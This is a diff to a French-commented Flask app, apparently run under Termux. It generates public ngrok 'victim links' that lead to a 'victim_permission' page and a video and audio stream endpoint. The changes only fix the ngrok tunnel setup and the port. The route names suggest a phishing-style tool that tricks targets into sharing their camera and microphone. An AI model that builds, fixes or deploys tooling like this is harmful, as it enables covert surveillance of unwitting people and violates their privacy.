@@ -1,7 +1,7 @@
 from flask import Flask, render_template, request, jsonify
 import socket
 import pyfiglet
-from pyngrok import ngrok  # Bibliothèque Ngrok
+from pyngrok import ngrok, conf  # Import de Ngrok
 
 # Créer une interface ASCII art avec pyfiglet
 def display_interface():
@@ -47,10 +47,11 @@ def index():
 @app.route("/generate_victim_link", methods=["POST"])
 def generate_victim_link():
     input_link = request.form['input_link']
+    
     # Lien Ngrok public généré
-    ngrok_tunnel = ngrok.connect(port)
-    public_url = ngrok_tunnel.public_url
+    public_url = ngrok.connect(5000).public_url  # Ngrok sur le port 5000
     victim_link = f"{public_url}/victim_permission"
+    
     print(f"Lien généré pour la victime : {victim_link}")
     return render_template("generated_link.html", victim_link=victim_link)
 
@@ -62,8 +63,7 @@ def victim_permission():
 # Route pour commencer le stream
 @app.route("/start_stream", methods=["POST"])
 def start_stream():
-    # Crée un lien local pour diffuser le flux
-    stream_url = f"http://{local_ip}:{port}/stream"
+    stream_url = f"http://{local_ip}:5000/stream"
     return jsonify({"stream_url": stream_url})
 
 # Route pour afficher le flux vidéo et audio
@@ -73,8 +73,12 @@ def stream():
 
 # Lancer le serveur Flask
 if __name__ == "__main__":
+    # Ajouter le chemin vers Ngrok si nécessaire
+    conf.get_default().ngrok_path = "/data/data/com.termux/files/usr/bin/ngrok"  # Remplacez par le chemin correct
+
     # Fixer un port unique
-    port = 5000  # Port standard
+    port = 5000
     local_ip = get_local_ip()
-    print(f"Serveur en cours d'exécution sur : http://{local_ip}:{port}")
+    
+    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
     app.run(host="0.0.0.0", port=port)
